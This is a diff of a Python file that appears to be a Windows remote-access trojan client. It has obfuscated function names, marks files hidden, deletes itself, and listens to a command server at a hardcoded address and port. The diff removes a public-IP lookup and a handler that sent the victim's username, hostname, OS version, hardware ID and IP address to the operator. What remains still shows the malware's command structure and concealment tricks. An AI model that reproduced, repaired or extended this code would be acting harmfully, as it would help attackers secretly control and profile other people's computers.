@@ -2,7 +2,6 @@
 import os
 from os import _exit
 import socket
-from urllib import request
 import threading
 import time
 from subprocess import check_output, DEVNULL, Popen, PIPE # HWID GET, +other
@@ -20,7 +19,6 @@ FILE_ATTRIBUTE_HIDDEN = 0x2
 
 class FILE_ATTRIBUTE(Structure):
     _fields_ = [("dwFileAttributes", wintypes.DWORD)]
-
 
 def LuminaMystGroveWhisper():
     current_exe_path = sys.argv[0]
@@ -57,23 +55,14 @@ def FloraNovaLumisZephyr():
         pass
 
 
-FloraNovaLumisZephyr()
 
-
-server_ip = "127.0.0.1"
 server_ip = "127.0.0.1"
 server_port = 4639
+
 data_transfering = False #no error, data mix
 
 build = "v1.2"
 username = os.environ.get('USERNAME')
-hostname = os.environ.get('COMPUTERNAME')
-
-try:
-    with request.urlopen("http://api.ipify.org") as response:
-        ip_address = response.read().decode('utf-8')
-except:
-    pass
 
 def FullDelete():
     try:
@@ -149,14 +138,7 @@ def handle_server_commands(client_socket):
                     pass
                 finally:
                     data_transfering = False
-            elif data == "Ap3x1nfo":
-                try:
-                    data_transfering = True
-                    client_socket.send(f"Ap3x1nfo::{username}::{hostname}::{os_version}::{build}::{hwid}::{ip_address}".encode())
-                except:
-                    pass
-                finally:
-                    data_transfering = False
+
             elif data == "Ap3xD1sconnect":
                 _exit(0)
 
